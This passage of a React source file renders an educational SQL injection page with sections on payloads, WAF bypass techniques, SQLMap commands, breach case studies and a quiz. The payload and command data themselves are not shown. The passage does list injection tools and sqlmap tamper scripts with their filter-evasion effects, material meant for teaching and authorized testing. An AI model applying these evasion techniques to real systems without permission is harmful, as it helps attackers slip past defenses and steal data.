                        <Typography variant="body2" sx={{ fontFamily: "monospace", mb: 1 }}>{db.timeBased}</Typography>

                        <Typography variant="caption" sx={{ fontWeight: 700 }}>String Concatenation</Typography>
                        <Typography variant="body2" sx={{ fontFamily: "monospace", mb: 1 }}>{db.stringConcat}</Typography>

                        <Typography variant="caption" sx={{ fontWeight: 700 }}>Comments</Typography>
                        <Typography variant="body2" sx={{ fontFamily: "monospace" }}>{db.comments}</Typography>
                      </Grid>
                    </Grid>
                  </AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* ========== SECTION: COMMON PAYLOADS ========== */}
            <Paper
              id="payloads"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <DataObjectIcon sx={{ color: accent }} />
                Common Payloads Reference
              </Typography>

              <Alert severity="warning" sx={{ mb: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Educational Use Only</AlertTitle>
                These payloads are for authorized testing, CTF challenges, and understanding attack vectors.
                Never use on systems without explicit permission.
              </Alert>

              <TableContainer component={Paper} sx={{ borderRadius: 2 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
                      <TableCell sx={{ fontWeight: 700 }}>Category</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Payload</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Use Case</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {commonPayloads.map((row, idx) => (
                      <TableRow key={idx}>
                        <TableCell>
                          <Chip label={row.category} size="small" sx={{ fontSize: "0.7rem" }} />
                        </TableCell>
                        <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{row.payload}</TableCell>
                        <TableCell sx={{ fontSize: "0.85rem" }}>{row.use}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

            {/* ========== SECTION: WAF BYPASS ========== */}
            <Paper
              id="waf-bypass"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <TuneIcon sx={{ color: accent }} />
                WAF Bypass Techniques
              </Typography>

              <Typography variant="body1" sx={{ mb: 3 }}>
                Web Application Firewalls (WAFs) attempt to block SQL injection by pattern matching.
                Understanding bypass techniques helps in both testing and improving WAF rules.
              </Typography>

              <Alert severity="info" sx={{ mb: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Defense Note</AlertTitle>
                WAFs are defense-in-depth, not a primary fix. Proper parameterization is the real solution.
                If an attacker can bypass your WAF, parameterized queries still protect you.
              </Alert>

              <Grid container spacing={2}>
                {wafBypassTechniques.map((tech, idx) => (
                  <Grid item xs={12} sm={6} md={4} key={idx}>
                    <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha(accent, 0.03), height: "100%" }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: accent, mb: 1 }}>
                        {tech.technique}
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                        {tech.description}
                      </Typography>
                      <Typography variant="body2" sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.2), p: 1, borderRadius: 1 }}>
                        {tech.example}
                      </Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Paper>

            {/* ========== SECTION: TOOLS ========== */}
            <Paper
              id="tools"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <TerminalIcon sx={{ color: accent }} />
                SQLMap & Testing Tools
              </Typography>

              <Typography variant="body1" sx={{ mb: 3 }}>
                SQLMap is the most popular automated SQL injection testing tool. It can detect and exploit
                SQL injection vulnerabilities, enumerate databases, and extract data.
              </Typography>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
                Essential SQLMap Commands
              </Typography>

              <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
                      <TableCell sx={{ fontWeight: 700 }}>Command</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {sqlmapCommands.map((row, idx) => (
                      <TableRow key={idx}>
                        <TableCell sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{row.command}</TableCell>
                        <TableCell sx={{ fontSize: "0.85rem" }}>{row.description}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                      Other Useful Tools
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="Burp Suite - Intercept and modify requests" secondary="Commercial with free community edition" /></ListItem>
                      <ListItem><ListItemText primary="OWASP ZAP - Free web security scanner" secondary="Open source alternative to Burp" /></ListItem>
                      <ListItem><ListItemText primary="Havij - Automated SQL injection tool" secondary="Point and click interface" /></ListItem>
                      <ListItem><ListItemText primary="jSQL Injection - Java-based SQLi tool" secondary="Cross-platform GUI tool" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                      Common Tamper Scripts
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="space2comment" secondary="Replace spaces with /**/ comments" /></ListItem>
                      <ListItem><ListItemText primary="randomcase" secondary="Random case for SQL keywords" /></ListItem>
                      <ListItem><ListItemText primary="between" secondary="Replace > with BETWEEN" /></ListItem>
                      <ListItem><ListItemText primary="charencode" secondary="URL encode all characters" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>

            {/* ========== SECTION: CASE STUDIES ========== */}
            <Paper
              id="case-studies"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <HistoryIcon sx={{ color: accent }} />
                Real-World Case Studies
              </Typography>

              <Typography variant="body1" sx={{ mb: 3 }}>
                Learning from major breaches helps understand the real-world impact of SQL injection
                and the importance of proper security measures.
              </Typography>

              <Grid container spacing={3}>
                {caseStudies.map((study, idx) => (
                  <Grid item xs={12} md={6} key={idx}>
                    <Paper
                      sx={{
                        p: 3,
                        borderRadius: 3,
                        height: "100%",
                        bgcolor: alpha("#ef4444", 0.02),
                        borderLeft: `4px solid ${accent}`,
                      }}
                    >
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 1, color: accent }}>
                        {study.name}
                      </Typography>
                      <Chip label={study.impact} size="small" sx={{ mb: 2, bgcolor: alpha("#ef4444", 0.15), color: "#ef4444" }} />
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        <strong>Technique:</strong> {study.technique}
                      </Typography>
                      <Typography variant="body2" sx={{ mb: 1 }}>
                        <strong>Cost:</strong> {study.cost}
                      </Typography>
                      <Alert severity="info" sx={{ mt: 2 }}>
                        <Typography variant="body2"><strong>Lesson:</strong> {study.lesson}</Typography>
                      </Alert>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Paper>

            {/* ========== SECTION: QUIZ ========== */}
            <Box id="quiz" sx={{ scrollMarginTop: 96 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
                <QuizIcon sx={{ color: accent, fontSize: 36 }} />
                Test Your Knowledge
              </Typography>
              <QuizSection
                questions={quizQuestions}
                questionsPerQuiz={QUIZ_QUESTION_COUNT}
                accentColor={QUIZ_ACCENT_COLOR}
              />
            </Box>

          </Container>
        </Box>
      </Box>
    </LearnPageLayout>
  );
};

export default SQLInjectionPage;
